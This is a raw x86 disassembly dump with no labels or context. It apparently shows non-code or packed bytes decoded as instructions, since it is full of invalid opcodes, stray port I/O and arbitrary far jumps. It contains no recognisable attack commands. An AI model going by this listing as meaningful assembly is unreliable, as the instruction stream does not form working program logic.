  4505c1:	adc    dl,BYTE PTR [edx+esi*1-0x5]
  4505c5:	adc    DWORD PTR [eax-0x55ee22ce],eax
  4505cb:	xor    al,BYTE PTR [edx+0xf]
  4505ce:	popf   
  4505cf:	xor    ebp,DWORD PTR [eax+edx*1-0x1b]
  4505d3:	xor    edi,DWORD PTR [edx+0x16]
  4505d6:	ins    BYTE PTR es:[edi],dx
  4505d7:	xor    al,0x30
  4505d9:	push   ss
  4505da:	jns    0x450610
  4505dc:	(bad)  
  4505dd:	pop    ss
  4505de:	in     eax,0x34
  4505e0:	movhps QWORD PTR [ebp+esi*1+0x73],xmm2
  4505e5:	adc    eax,0x168f3577
  4505ea:	in     al,0x35
  4505ec:	dec    edi
  4505ed:	adc    al,0x81
  4505ef:	add    BYTE PTR ss:[eax],al
	...
  45060e:	pop    esi
  45060f:	push   ss
  450610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450611:	ss jnp 0x45062a
  450614:	jp     0x45064d
  450616:	push   edi
  450617:	adc    ebp,esp
  450619:	cmp    edi,edi
  45061b:	daa    
  45061c:	adc    DWORD PTR [edx],edi
  45061e:	or     eax,0x2735264e
  450623:	jl     0x45064b
  450625:	popw   ss
  450627:	shl    DWORD PTR ds:0x25f317ae,1
  45062d:	jne    0x450635
  45062f:	stos   BYTE PTR es:[edi],al
  450630:	sub    DWORD PTR [ebx+0x0],edx
  450633:	mov    ebp,DWORD PTR [ecx]
  450635:	pop    ebp
  450636:	clc    
  450637:	mov    al,0x28
  450639:	outs   dx,DWORD PTR ds:[esi]
  45063a:	lock fisubr WORD PTR [eax]
  45063d:	jns    0x450627
  45063f:	xlat   BYTE PTR ds:[ebx]
  450640:	sub    edx,esp
  450642:	loopne 0x4506a6
  450644:	sub    ah,BYTE PTR ds:0x7f29fcdb
  45064a:	ror    edi,cl
  45064c:	sub    al,dl
  45064e:	dec    ebx
  45064f:	popa   
  450650:	sub    ebx,DWORD PTR [eax]
  450652:	inc    edx
  450653:	and    BYTE PTR [ebx],ch
  450655:	push   edi
  450656:	cmp    ch,ah
  450658:	sub    edx,DWORD PTR [edx+esi*1+0x2aa22bc7]
  45065f:	mov    cl,0x2b
  450661:	shl    DWORD PTR [edx],0x75
  450664:	sub    eax,DWORD PTR [eax]
  450666:	or     eax,0x52fdbc67
  45066b:	stos   DWORD PTR es:[edi],eax
  45066c:	cld    
  45066d:	dec    DWORD PTR ds:0xb2c68
	...
  45068f:	add    ch,bh
  450691:	xor    ch,BYTE PTR [esi+eiz*8]
  450694:	std    
  450695:	mov    bh,0x2c
  450697:	cld    
  450698:	std    
  450699:	and    BYTE PTR ds:0x2d4bdc3f,ch
  45069f:	ja     0x45067d
  4506a1:	out    0x2d,al
  4506a3:	lods   eax,DWORD PTR ds:[esi]
  4506a4:	fadd   QWORD PTR [ecx+0x35dccf2d]
  4506aa:	cs jnp 0x4506ec
  4506ad:	stc    
  4506ae:	cs and al,0x3e
  4506b1:	jp     0x4506e2
  4506b3:	pop    ebp
  4506b4:	add    BYTE PTR ds:[ebp-0x61ee82d0],cl
  4506bb:	xor    BYTE PTR [esi+0x7f305e10],cl
  4506c1:	adc    BYTE PTR [ebx+0x30],ch
  4506c4:	js     0x4506d6
  4506c6:	dec    ebp
  4506c7:	xor    BYTE PTR [eax-0x14cfe7f0],dl
  4506cd:	adc    dl,bh
  4506cf:	das    
  4506d0:	or     BYTE PTR [ecx+edx*8],dl
  4506d3:	aaa    
  4506d4:	repz adc edx,DWORD PTR [edx]
  4506d7:	xor    dh,bh
  4506d9:	adc    esp,DWORD PTR ds:0x35145230
  4506df:	xor    BYTE PTR [ebp+0x14],al
  4506e2:	dec    edi
  4506e3:	xor    BYTE PTR [edi],dl
  4506e5:	adc    al,0x83
  4506e7:	xor    BYTE PTR [ebx+0x13],dl
  4506ea:	mov    al,0x30
  4506ec:	imul   edx,DWORD PTR [ebx],0x132c30ce
  4506f2:	stc    
  4506f3:	xor    BYTE PTR [eax],al
	...
  450711:	add    bl,bl
  450713:	adc    cl,BYTE PTR [edi]
  450715:	xor    ebx,esi
  450717:	adc    cl,BYTE PTR [ebp+0x31]
  45071a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  45071b:	adc    al,BYTE PTR [ebp-0x46eda4cf]
  450721:	xor    esp,ebp
  450723:	adc    eax,0x15e03211
  450728:	xor    ah,BYTE PTR fs:[ebp+0x2a323015]
  45072f:	adc    eax,0x14a632aa
  450734:	mov    ecx,0x5b16ba2b
  450739:	das    
  45073a:	cmp    BYTE PTR [ebx],bl
  45073c:	jmp    0x450766
  45073e:	pop    ebp
  45073f:	sbb    ch,BYTE PTR [eax]
  450741:	sub    DWORD PTR [eax+0x1a],edx
  450744:	inc    edi
  450745:	sub    DWORD PTR [edi],esp
  450747:	sbb    cl,BYTE PTR [edx+ebp*1]
  45074a:	inc    edx
  45074b:	sbb    al,BYTE PTR [eax]
  45074d:	stos   BYTE PTR es:[edi],al
  45074e:	xor    al,0xcd
  450750:	cmp    DWORD PTR [edi+0x5239d324],ecx
  450756:	daa    
  450757:	call   0xc839:0x52370539
  45075e:	aaa    
  45075f:	adc    al,0x39
  450761:	mov    bh,0x27
  450763:	loop   0x45079d
  450765:	jns    0x45078e
  450767:	jo     0x4507a1
  450769:	dec    ebp
  45076a:	neg    BYTE PTR [ecx+0x6af62038]
  450770:	cmp    cl,ch
  450772:	ficomp WORD PTR [ebp-0x8]
  450775:	lods   eax,DWORD PTR ds:[esi]
	...
  450792:	add    BYTE PTR [eax],al
  450794:	push   cs
  450795:	add    BYTE PTR [eax],al
  450797:	out    0xde,al
  450799:	in     eax,dx
  45079a:	das    
  45079b:	push   ds
  45079c:	fst    DWORD PTR [esi]
  45079e:	xor    BYTE PTR [ebx-0x1f],dl
  4507a1:	jge    0x4507d2
  4507a3:	fidivr WORD PTR fs:[edi+ebp*1+0x7d]
  4507a8:	ds inc ebx
  4507aa:	das    
  4507ab:	leave  
  4507ac:	ds pop esi
  4507ae:	das    
  4507af:	jmp    0xc873f6f5
  4507b4:	cmp    DWORD PTR [eax],ebx
  4507b6:	das    
  4507b7:	fbld   TBYTE PTR [ecx]
  4507b9:	scas   al,BYTE PTR es:[edi]
  4507ba:	or     DWORD PTR cs:[eax],ebx
  4507bd:	shr    DWORD PTR [esi],1
  4507bf:	or     al,0x20
  4507c1:	outs   dx,DWORD PTR ds:[esi]
  4507c2:	sbb    WORD PTR cs:[esi+0x2f013d2e],cx
  4507ca:	cs mov edi,ecx
  4507cd:	push   edx
  4507ce:	outs   dx,BYTE PTR cs:[esi]
  4507d0:	add    DWORD PTR [ecx],ebp
  4507d2:	cs es sti 
  4507d5:	retf   0xc72d
  4507d8:	loopne 0x4507a8
  4507da:	sub    eax,0x2d89d865
  4507df:	fwait
  4507e0:	loopne 0x45077b
  4507e2:	sub    eax,0xe414f600
  4507e7:	xor    cl,BYTE PTR [esi+0x15]
  4507ea:	push   ss
  4507eb:	xor    edx,esi
  4507ed:	adc    DWORD PTR [ebx+esi*1+0x33d31218],esi
  4507f4:	std    
  4507f5:	sub    cl,BYTE PTR [edi]
  4507f7:	xor    al,0x0
	...
  450815:	add    ch,ch
  450817:	sub    al,BYTE PTR [eax+0x34]
  45081a:	mov    dl,0x2a
  45081c:	dec    esp
  45081d:	xor    al,0xa0
  45081f:	sub    ah,BYTE PTR [esp+esi*1+0x56]
  450823:	sub    edi,DWORD PTR [edx+0x34]
  450826:	cmp    DWORD PTR [ebx],ebp
  450828:	xchg   ecx,eax
  450829:	xor    al,0xe
  45082b:	sub    ebp,DWORD PTR [eax]
  45082d:	xor    eax,0x35630f88
  450832:	sub    BYTE PTR [edx],0xb8
  450835:	xor    eax,0x35f52a69
  45083a:	stos   DWORD PTR es:[edi],eax
  45083b:	adc    BYTE PTR [ebx],bl
  45083d:	ss aam 0xd
  450840:	jbe    0x450878
  450842:	test   BYTE PTR ds:0x112836df,cl
  450848:	pop    edx
  450849:	aaa    
  45084a:	xchg   ecx,eax
  45084b:	adc    BYTE PTR [edi+0x7108837],dh
  450851:	cmp    ch,ah
  450853:	sub    edx,DWORD PTR [eax-0x23d41cc8]
  450859:	cmp    BYTE PTR [esi-0x75c6ffd5],al
  45085f:	es push ss
  450861:	cmp    al,BYTE PTR [edx+ebp*1]
  450864:	repnz cmp al,0xf1
  450867:	and    eax,0x25cd3e83
  45086c:	out    dx,eax
  45086d:	ds pop ecx
  45086f:	daa    
  450870:	jp     0x4508b1
  450872:	and    al,0x5e
  450874:	cli    
  450875:	dec    DWORD PTR [ebx+eax*1+0x0]
	...
  450898:	or     eax,0xdc0e2d68
  45089d:	mov    ds:0x34dc5d2d,al
  4508a2:	sub    eax,0x2d1f3cb7
  4508a7:	in     al,dx
  4508a8:	cmp    al,0xfd
  4508aa:	xor    DWORD PTR [edi],ebp
  4508ac:	aas    
  4508ad:	popf   
  4508ae:	xor    cl,BYTE PTR [ebp+0x3f]
  4508b1:	jo     0x4508e5
  4508b3:	jo     0x4508d4
  4508b5:	sub    BYTE PTR [edx],dh
  4508b7:	rcr    DWORD PTR [edi],0x11
  4508ba:	xor    ah,ah
  4508bc:	pop    ds
  4508bd:	cmc    
  4508be:	xor    ecx,esi
  4508c0:	pop    ds
  4508c1:	xor    cx,WORD PTR [esi]
  4508c4:	inc    BYTE PTR [edi+0x33]
  4508c7:	pop    ecx
  4508c8:	dec    ch
  4508ca:	xor    eax,DWORD PTR [ebx]
  4508cc:	add    DWORD PTR [eax],edi
  4508ce:	sub    BYTE PTR ds:0x313009f9,dl
  4508d4:	loope  0x4508d0
  4508d6:	das    
  4508d7:	aas    
  4508d8:	fldcw  WORD PTR [eax]
  4508da:	xor    BYTE PTR [ebp-0x1f],al
  4508dd:	push   ss
  4508de:	xor    BYTE PTR [ebx-0x27],dl
  4508e1:	sbb    al,0x30
  4508e3:	pop    ecx
  4508e4:	inc    ecx
  4508e5:	ret    0xaf2f
  4508e8:	cmp    DWORD PTR [edx],ecx
  4508ea:	sub    DWORD PTR [eax+eax*2],ebp
  4508ed:	pop    eax
  4508ee:	sub    DWORD PTR [eax],edi
  4508f0:	cmp    BYTE PTR [ebp+0x45231229],al
  4508f6:	cs dec edi
  4508f8:	sbb    ebx,DWORD PTR [ecx]
  4508fa:	cs je  0x4508fd
	...
  450919:	add    BYTE PTR [ebx],ah
  45091b:	iret   
  45091c:	les    ebx,FWORD PTR cs:[ebx]
  45091f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  450920:	lock add edi,DWORD PTR cs:[edi+ebp*1]
  450925:	js     0x450921
  450927:	push   cs
  450928:	xor    bh,ah
  45092a:	add    dh,BYTE PTR [ecx]
  45092c:	and    al,0x77
  45092e:	cmc    
  45092f:	inc    DWORD PTR [eax-0x12e7acd5]
  450935:	sub    ah,cl
  450937:	push   ss
  450938:	jne    0x450964
  45093a:	inc    ecx
  45093b:	pop    ss
  45093c:	call   0x3826:0x5b1c8c2c
  450943:	sbb    dl,BYTE PTR [eax+0x29]
  450946:	lods   al,BYTE PTR ds:[esi]
  450947:	sbb    bh,ah
  450949:	repz clc 
  45094b:	pop    eax
  45094c:	call   0x7833:0xc2000d03
  450953:	adc    BYTE PTR [edi+0x33],al
  450956:	mov    dl,0xf
  450958:	pop    ebp
  450959:	xor    ch,BYTE PTR [edx+0x2f34f00e]
  45095f:	or     eax,0x11e32f91
  450964:	or     al,0x31
  450966:	call   0xe3705682
  45096b:	pop    ss
  45096c:	(bad)  
  45096d:	sub    dh,BYTE PTR [edi]
  45096f:	pop    ss
  450970:	outs   dx,DWORD PTR ds:[esi]
  450971:	sub    eax,0x2d88167e
  450976:	jno    0x45098e
  450978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  450979:	sub    eax,0x2a3015f1
	...
  45099a:	add    BYTE PTR [eax],al
  45099c:	das    
  45099d:	push   ss
  45099e:	inc    ebx
  45099f:	sub    al,dh
  4509a1:	adc    al,0xab
  4509a3:	sub    edx,DWORD PTR [eax]
  4509a5:	sbb    al,0x92
  4509a7:	sub    BYTE PTR [esi+0x1a],al
  4509aa:	adc    esp,DWORD PTR [esi]
  4509ac:	xor    BYTE PTR [ecx],bl
  4509ae:	push   0x27
  4509b0:	or     eax,0x6083e700
  4509b5:	pop    eax
  4509b6:	inc    esi
  4509b7:	add    al,0xd
  4509b9:	add    BYTE PTR [esi],dh
  4509bb:	xor    al,0xba
  4509bd:	ud2    
  4509bf:	xor    al,0xb3
  4509c1:	minps  xmm6,XMMWORD PTR [ebp*2+0x142000f]
  4509c9:	test   eax,0x49f99d2f
  4509ce:	das    
  4509cf:	push   ebx
  4509d0:	loope  0x450a21
  4509d2:	das    
  4509d3:	out    0xd9,eax
  4509d5:	or     ebp,DWORD PTR [edi]
  4509d7:	imul   esp,eax,0xd8512ea0
  4509dd:	icebp  
  4509de:	sub    eax,0x2d763cb7
  4509e3:	in     al,dx
  4509e4:	aas    
  4509e5:	sbb    ch,BYTE PTR ds:0x2cc23fab
  4509eb:	mov    ds:0xbb2cca3f,eax
  4509f0:	pop    ds
  4509f1:	mov    dl,0x2c
  4509f3:	ret    
  4509f4:	pop    ds
  4509f5:	mov    edx,0xe21f8b2c
  4509fa:	sub    al,0x83
  4509fc:	pop    ds
  4509fd:	jmp    0x0:0x7b2c
	...
  450a1c:	add    BYTE PTR [eax],al
  450a1e:	call   ecx
  450a20:	sub    al,0x83
  450a22:	(bad)  
  450a23:	ds sub al,0x7
  450a26:	inc    BYTE PTR [esi-0x3c0205ce]
  450a2c:	xor    DWORD PTR [edx-0x5],edx
  450a2f:	shl    BYTE PTR [ecx],1
  450a31:	stos   BYTE PTR es:[edi],al
  450a32:	lock dec edx
  450a34:	xor    esi,ebx
  450a36:	call   0xe43e3b90
  450a3b:	and    dh,BYTE PTR [ecx]
  450a3d:	push   edi
  450a3e:	cmp    cl,ch
  450a40:	xor    BYTE PTR [ebx+esi*1+0x26d2303b],ch
  450a47:	test   DWORD PTR [esi],esi
  450a49:	mov    esp,DWORD PTR [ecx]
  450a4b:	sahf   
  450a4c:	ss cmp DWORD PTR gs:[eax+0x36],ecx
  450a51:	scas   al,BYTE PTR es:[edi]
  450a52:	xor    DWORD PTR [ebp+0x35],ebx
  450a55:	fldenv [edi]
  450a57:	mov    ecx,0xc3252934
  450a5c:	cmp    eax,DWORD PTR [eax]
  450a5e:	movaps xmm0,XMMWORD PTR [eax-0x5d781c4]
  450a65:	cmp    eax,0x3e391d80
  450a6a:	pop    ebx
  450a6b:	push   ds
  450a6c:	cmp    BYTE PTR [edi],bh
  450a6e:	jp     0x450a8e
  450a70:	add    BYTE PTR [eax],al
  450a72:	xor    al,0x73
  450a74:	cli    
  450a75:	dec    DWORD PTR [eax+0x3]
  450a78:	add    BYTE PTR [eax],al
  450a7a:	dec    edx
  450a7b:	or     al,0xc0
  450a7d:	xor    DWORD PTR [eax],esi
  450a7f:	or     al,0x2
  450a81:	xor    al,BYTE PTR [eax]
	...
  450a9f:	add    BYTE PTR [eax+edx*1+0x12603304],ah
  450aa6:	mov    bl,0x33
  450aa8:	jo     0x450ad1
  450aaa:	sysexit 
  450aac:	mov    ebx,0xda35f40f
  450ab1:	and    al,0x2
  450ab3:	aaa    
  450ab4:	shl    BYTE PTR ds:0x24d3375a,1
  450aba:	std    
  450abb:	aaa    
  450abc:	mov    esi,0xd388f2a
  450ac1:	sub    edx,DWORD PTR [edx]
  450ac3:	cmp    DWORD PTR [ebx+0x2a3b6d29],eax
  450ac9:	sub    bl,BYTE PTR [edi-0x2fd790c5]
  450acf:	cmp    edx,esp
  450ad1:	sub    BYTE PTR [eax],bh
  450ad3:	cmp    al,0x50
  450ad5:	sub    BYTE PTR [ebx-0x4dd7ecc4],bl
  450adb:	cmp    al,0xa8
  450add:	daa    
  450ade:	fstp   TBYTE PTR [eax+esi*2]
  450ae1:	sbb    eax,0x1e933d6d
  450ae6:	int    0x3d
  450ae8:	push   ebx
  450ae9:	sbb    al,0x7d
  450aeb:	ds lock sbb eax,0x1b6e3f12
  450af2:	cmp    DWORD PTR [edi],0xfd9c690d
  450af8:	push   edx
  450af9:	mov    ah,0x3
  450afb:	add    BYTE PTR ds:0xfd9b33e9,cl
  450b01:	lahf   
  450b02:	sub    al,0x34
	...
  450b20:	add    BYTE PTR [eax],al
  450b22:	(bad)  
  450b23:	mov    ecx,0x52fe2c2d
  450b28:	sub    BYTE PTR [esi-0x44d7141f],bh
  450b2e:	fsubr  DWORD PTR [ebp+0x1de37b28]
  450b34:	sub    bh,dh
  450b36:	fcomi  st,st(7)
  450b38:	sub    ah,BYTE PTR [ecx+0x42]
  450b3b:	mov    ch,0x2a
  450b3d:	sub    eax,0x4244545
  450b42:	xor    al,0x50
  450b44:	and    eax,0x24b13449
  450b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450b4a:	and    al,0x1a
  450b4c:	and    eax,0x250a24dc
  450b51:	out    0x14,eax
  450b53:	repnz and al,0xfe
  450b56:	adc    al,0x61
  450b58:	adc    BYTE PTR es:[edi],al
  450b5b:	dec    edx
  450b5c:	xor    eax,DWORD PTR es:[edi]
  450b5f:	int3   
  450b60:	es stos DWORD PTR es:[edi],eax
  450b62:	mul    DWORD PTR [edi]
  450b64:	es shl bh,cl
  450b67:	test   eax,0x8de64c27
  450b6c:	daa    
  450b6d:	shl    esi,cl
  450b6f:	push   0x16d90f20
  450b74:	sub    BYTE PTR [edi-0x2f],bh
  450b77:	jp     0x450b99
  450b79:	(bad)  
  450b7a:	dec    ecx
  450b7b:	jns    0x450b9d
  450b7d:	xlat   BYTE PTR ds:[ebx]
  450b7e:	inc    ecx
  450b7f:	jbe    0x450ba1
  450b81:	out    dx,eax
  450b82:	cmp    DWORD PTR [edi+0x20],ecx
	...
  450ba4:	xor    BYTE PTR [ebx+0x21],al
  450ba7:	and    eax,0x271e0028
  450bac:	xchg   ebx,eax
  450bad:	adc    ebx,DWORD PTR [ecx+0x26]
  450bb0:	add    al,0x16
  450bb2:	jmp    0x7f24:0x6d14c424
  450bb9:	adc    eax,0xd2482
  450bbe:	out    0xb3,eax
  450bc0:	cmp    BYTE PTR [ebp-0x1e],dl
  450bc3:	add    DWORD PTR ds:0xff33e200,ecx
  450bc9:	push   cs
  450bca:	rdpmc  
  450bcc:	enter  0xcd0e,0x32
  450bd0:	lea    ecx,[edi]
  450bd2:	jb     0x450c06
  450bd4:	ins    BYTE PTR es:[edi],dx
  450bd5:	(bad)  
  450bd7:	xor    cl,bl
  450bd9:	push   cs
  450bda:	stos   BYTE PTR es:[edi],al
  450bdb:	xor    DWORD PTR [esi+0x12],edi
  450bde:	imul   esi,DWORD PTR [ecx],0x30641170
  450be4:	and    cl,BYTE PTR [edx+edi*4]
  450be7:	das    
  450be8:	fmul   DWORD PTR [ebx]
  450bea:	stc    
  450beb:	cs sub al,0xb
  450bee:	int3   
  450bef:	cs mov dl,0xa
  450bf2:	push   edi
  450bf3:	cs leave 
  450bf5:	or     bl,BYTE PTR ds:0x740e1f2e
  450bfb:	sub    eax,0x2d410d9f
  450c00:	or     ax,0x2d07
  450c04:	scas   eax,DWORD PTR es:[edi]
  450c05:	or     eax,0x2ced
	...
  450c26:	add    ecx,DWORD PTR ds:0xcdb1b13
  450c2c:	and    bl,BYTE PTR [ebx]
  450c2e:	cmp    ecx,DWORD PTR ds:0xc7e1b42
  450c34:	mov    DWORD PTR [ebx],ebx
  450c36:	push   0x701bd30c
  450c3b:	or     al,0xbc
  450c3d:	sbb    ecx,DWORD PTR [edi]
  450c3f:	sbb    BYTE PTR [eax],al
  450c41:	rcl    DWORD PTR [esi],1
  450c43:	ret    0xc37
  450c46:	or     esp,edx
  450c48:	aaa    
  450c49:	js     0x450c4c
  450c4b:	jb     0x450c84
  450c4d:	dec    esi
  450c4e:	stc    
  450c4f:	xor    dh,BYTE PTR [edi]
  450c51:	jmp    0x167bc147
  450c56:	sub    BYTE PTR [ebp+0x42203e36],al
  450c5c:	ss scas eax,DWORD PTR es:[edi]
  450c5e:	sbb    ch,ch
  450c60:	xor    eax,0x35d410bd
  450c65:	or     edi,DWORD PTR [bp+0x35]
  450c69:	js     0x450c6e
  450c6b:	outs   dx,DWORD PTR ds:[esi]
  450c6c:	xor    eax,0x359ffb82
  450c71:	mov    ebx,?
  450c73:	popf   
  450c74:	xor    eax,0x358c2b7e
  450c79:	and    BYTE PTR [ebx],0x96
  450c7c:	xor    eax,0x35481b2a
  450c81:	and    al,0x13
  450c83:	inc    edx
  450c84:	xor    eax,0x35340b16
  450c89:	or     BYTE PTR [eax],al
	...
  450ca7:	add    BYTE PTR [ebx],al
  450ca9:	pop    esi
  450caa:	xor    eax,0x354ffb12
  450caf:	sbb    al,0xf3
  450cb1:	dec    ecx
  450cb2:	xor    eax,0x34fc2b0e
  450cb7:	lock and eax,DWORD PTR [esi]
  450cba:	xor    eax,0x34f81bda
  450cbf:	aam    0x13
  450cc1:	repnz xor al,0xc6
  450cc4:	or     esp,DWORD PTR [esi*1+0x350e0218]
  450ccb:	and    bh,dl
  450ccd:	mov    edi,0xb9f22c34
  450cd2:	xor    al,0x1e
  450cd4:	sub    ch,BYTE PTR [esp+esi*1+0x55f32d00]
  450cdb:	cmp    eax,edi
  450cdd:	repnz addr16 cmp ecx,ecx
  450ce1:	repnz imul edi,DWORD PTR [ebx],0x3b7bf323
  450ce8:	cmc    
  450ce9:	icebp  
  450cea:	jge    0x450d27
  450cec:	fcomip st,st(1)
  450cee:	(bad)  
  450cef:	cmp    edx,ecx
  450cf1:	icebp  
  450cf2:	xchg   ecx,eax
  450cf3:	cmp    edi,DWORD PTR [ebx-0x22c45c0f]
  450cf9:	icebp  
  450cfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450cfb:	cmp    esi,edi
  450cfd:	icebp  
  450cfe:	mov    bh,0x3b
  450d00:	stc    
  450d01:	icebp  
  450d02:	mov    ecx,0xcbf2733b
  450d07:	cmp    esp,ebp
  450d09:	icebp  
  450d0a:	int    0x3b
	...
  450d28:	add    BYTE PTR [eax],al
  450d2a:	iret   
  450d2b:	icebp  
  450d2c:	fistp  QWORD PTR [ebx]
  450d2e:	shl    ecx,0xe1
  450d31:	cmp    ecx,DWORD PTR [ebx-0xe]
  450d34:	repz cmp ecx,DWORD PTR [ebp-0xe]
  450d38:	cmc    
  450d39:	cmp    esp,edi
  450d3b:	repnz pop es
  450d3d:	cmp    al,0xe9
  450d3f:	repnz or DWORD PTR [ebx+eax*8],edi
  450d43:	repnz sbb edi,DWORD PTR [edx*8-0x40c3e20e]
  450d4b:	repnz das 
  450d4d:	cmp    al,0xb1
  450d4f:	repnz xor DWORD PTR [ebx+ebx*8],edi
  450d53:	repnz inc ebx
  450d55:	cmp    al,0x7d
  450d57:	repnz inc ebp
  450d59:	cmp    al,0x97
  450d5b:	repnz push edi
  450d5d:	cmp    al,0x99
  450d5f:	repnz pop ecx
  450d61:	cmp    al,0x93
  450d63:	repnz imul edi,DWORD PTR [eax*2+0x2f3c6e20],0x20
  450d6c:	cmp    BYTE PTR [ecx*1+0x49861fe4],0xb2
  450d74:	pop    ds
  450d75:	xchg   esp,eax
  450d76:	inc    ecx
  450d77:	loopne 0x450d98
  450d79:	call   0x7c31:0xa81f8639
  450d80:	pop    ds
  450d81:	scas   al,BYTE PTR es:[edi]
  450d82:	sub    edx,ecx
  450d84:	pop    ds
  450d85:	mov    esp,0xc81fa821
  450d8a:	sbb    DWORD PTR [edi+ebx*1+0xd5],esp
	...
  450da9:	add    BYTE PTR [eax],al
  450dab:	add    BYTE PTR [ecx],dl
  450dad:	mov    DWORD PTR [edi],ebx
  450daf:	call   0xf364e0bd
  450db4:	add    DWORD PTR [esi+0x1f],edi
  450db7:	(bad)  
  450db8:	stc    
  450db9:	push   eax
  450dba:	sbb    DWORD PTR [ecx],ecx
  450dbc:	lock xor ebx,DWORD PTR [ecx]
  450dbf:	sbb    ch,al
  450dc1:	inc    ebp
  450dc2:	sbb    DWORD PTR [eax+eiz*8],esi
  450dc5:	sbb    al,0x19
  450dc7:	fcom   DWORD PTR ds:[eax+0x3ad04a19]
  450dce:	sbb    DWORD PTR [eax-0x36e6e0b8],esp
  450dd4:	inc    eax
  450dd5:	and    BYTE PTR [ecx],bl
  450dd7:	out    0x38,al
  450dd9:	or     al,0x19
  450ddb:	add    BYTE PTR [ebx],dh
  450ddd:	pop    ebp
  450dde:	push   ds
  450ddf:	adc    al,0x2b
  450de1:	stc    
  450de2:	sbb    eax,0x1e5b232e
  450de7:	inc    esi
  450de8:	sbb    edi,DWORD PTR ds:0x7c13631e
  450dee:	push   ds
  450def:	jbe    0x450dfc
  450df1:	fistp  DWORD PTR ds:0x1ddf038e
  450df7:	scas   eax,DWORD PTR es:[edi]
  450df8:	sti    
  450df9:	mov    esi,0x1ef3bf1d
  450dfe:	push   ds
  450dff:	retf   
  450e00:	jmp    0x450ded
  450e02:	sbb    eax,0xcfffe3d9
  450e07:	and    DWORD PTR [ecx+0x420f012],ebx
  450e0d:	adc    esp,edi
  450e0f:	and    BYTE PTR [eax],al
	...
  450e2d:	add    BYTE PTR [eax],ah
  450e2f:	adc    DWORD PTR [eax],eax
  450e31:	and    DWORD PTR [ebx],esi
  450e33:	adc    DWORD PTR [eax],eax
  450e35:	and    DWORD PTR [ecx+edx*1],esi
  450e38:	sbb    BYTE PTR [ecx],ah
  450e3a:	aad    0x10
  450e3c:	inc    edi
  450e3d:	and    edi,ebp
  450e3f:	adc    BYTE PTR [ecx+eiz*1],bh
  450e42:	fist   WORD PTR [eax]
  450e44:	and    al,0x21
  450e46:	fcom   DWORD PTR [eax]
  450e48:	je     0x450e6a
  450e4a:	jno    0x450e5d
  450e4c:	dec    ebx
  450e4d:	and    BYTE PTR [ebx+0x11],dh
  450e50:	dec    edi
  450e51:	and    BYTE PTR [ebp+0x11],cl
  450e54:	stos   BYTE PTR es:[edi],al
  450e55:	and    BYTE PTR [esi+0x11],al
  450e58:	cdq    
  450e59:	and    BYTE PTR [ecx],ch
  450e5b:	adc    DWORD PTR [ebx+0x6e113b20],eax
  450e61:	and    BYTE PTR ds:0x1843e700,cl
  450e67:	push   ecx
  450e68:	jmp    0x1013:0xeb000d02
  450e6f:	adc    ch,ch
  450e71:	adc    esp,DWORD PTR [ebx]
  450e73:	adc    BYTE PTR [eax],dl
  450e75:	adc    al,0x24
  450e77:	adc    BYTE PTR [ecx-0x6cefa1ed],ch
  450e7d:	adc    ecx,DWORD PTR [ebx+0x10]
  450e80:	mov    ebp,0x9c107213
  450e85:	adc    esp,DWORD PTR [eax+0x10]
  450e88:	push   0x720f8a13
  450e8d:	adc    esp,eax
  450e8f:	syscall 
  450e91:	adc    eax,DWORD PTR [eax]
	...
  450eaf:	add    BYTE PTR [edx-0x43ecedf1],ch
  450eb5:	psubw  mm2,QWORD PTR [edx]
  450eb8:	mov    bl,0xf
  450eba:	add    cl,ah
  450ebc:	inc    DWORD PTR ds:0x26ffd72f
  450ec2:	das    
  450ec3:	inc    eax
  450ec4:	add    dl,ah
  450ec6:	cs test eax,edi
  450ec9:	dec    edx
  450eca:	cs clc 
  450ecc:	sbb    al,0x1c
  450ece:	cs jne 0x450ef0
  450ed1:	pusha  
  450ed2:	sub    eax,0x2ced1fc1
  450ed7:	and    bl,BYTE PTR [esi]
  450ed9:	jle    0x450f0d
  450edb:	into   
  450edc:	add    al,0x4f
  450ede:	xor    ch,BYTE PTR [esp+eax*1+0x330321b]
  450ee5:	jecxz  0x450f18
  450ee7:	ja     0x450ee4
  450ee9:	je     0x450f1c
  450eeb:	test   eax,0xe8315b23
  450ef0:	sbb    esi,edi
  450ef2:	xor    BYTE PTR [ecx-0xcf51dd],bh
  450ef8:	sbb    ebp,DWORD PTR [esi]
  450efa:	xor    BYTE PTR [ebx+0x1c381806],bh
  450f00:	add    DWORD PTR [edx+0x7df6d637],ebp
  450f06:	aaa    
  450f07:	jge    0x450efa
  450f09:	mov    ds:0x37292a37,eax
  450f0e:	aaa    
  450f0f:	pop    eax
  450f10:	and    eax,ebp
  450f12:	inc    DWORD PTR ss:[eax]
	...
  450f31:	add    BYTE PTR [ecx],bl
  450f33:	mov    dl,0x36
  450f35:	into   
  450f36:	adc    DWORD PTR [ecx],ecx
  450f38:	ss scas eax,DWORD PTR es:[edi]
  450f3a:	add    al,0xa9
  450f3c:	xor    eax,0x356d0755
  450f41:	test   DWORD PTR [bx+si],0x69f7ee35
  450f48:	xor    al,0x5d
  450f4a:	es cmp al,0x34
  450f4d:	sub    eax,0x345c26
  450f52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  450f53:	out    dx,eax
  450f54:	or     eax,0x2defca3c
  450f59:	cmp    al,0x7e
  450f5b:	out    dx,eax
  450f5c:	jae    0x450f9a
  450f5e:	cmp    DWORD PTR [eax],esp
  450f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  450f61:	cmp    al,0x6a
  450f63:	out    dx,eax
  450f64:	fnstsw WORD PTR [ebx+esi*4]
  450f67:	out    dx,eax
  450f68:	cld    
  450f69:	cmp    al,0x6f
  450f6b:	and    BYTE PTR [ecx],cl
  450f6d:	cmp    eax,0x3d4f210c
  450f72:	fsub   QWORD PTR [eax]
  450f74:	push   0x3d
  450f76:	(bad)  
  450f77:	pop    ds
  450f78:	mov    edi,DWORD PTR ds:0x3dc3208d
  450f7e:	jge    0x450fa0
  450f80:	out    0x3d,eax
  450f82:	push   ebp
  450f83:	in     eax,dx
  450f84:	push   ss
  450f85:	ds cmp ebp,ebp
  450f88:	dec    esi
  450f89:	ds sbb esi,ebp
  450f8c:	jb     0x450fcc
  450f8e:	mov    cl,0xec
